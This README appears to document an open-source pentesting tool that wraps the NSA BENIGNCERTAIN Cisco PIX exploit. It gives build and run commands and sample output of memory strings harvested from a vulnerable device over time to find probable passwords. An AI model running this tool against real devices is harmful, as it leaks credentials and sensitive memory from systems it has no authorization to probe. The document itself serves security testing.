# Quickstart
```
$ git clone https://github.com/VirtueSecurity/benigncertain-monitor.git
$ cd benigncertain-monitor
$ sudo docker build . -t benign-monitor
$ sudo docker run -it benign-monitor <host>
```
The service will continuously poll the vulnerable pix, extract ascii strinsg from memory, store the strings in a local sqlite datebase, and show the most frequently observed strings:

```
Starting monitor against 10.0.6.1
        string  count
0         5$dx      3
1          0(0      3
2         $c{l      3
3       (0"t&j      3
4   R$dkd$hf7!      2
5    %d1N=8$i-      2
6        $c)P0      1
7         1NlD      1
8        1NlD'      1
9       $c)P(0      1
10     $c)P1@_      1
```

# Overview
This dockerized python script is a wrapper for the NSA BENIGNCERTAIN Cisco exploit. This script polls the vulnerable service over time to identify probable passwords and other potentially sensitive information. Since the NSA exploit previously only revealed a point in time status, we built this as a service to show impact over broader period of time.

# Credit

This service is an opensource component of our service-backed pentesting platform [PurpleLeaf](https://purpleleaf.io)

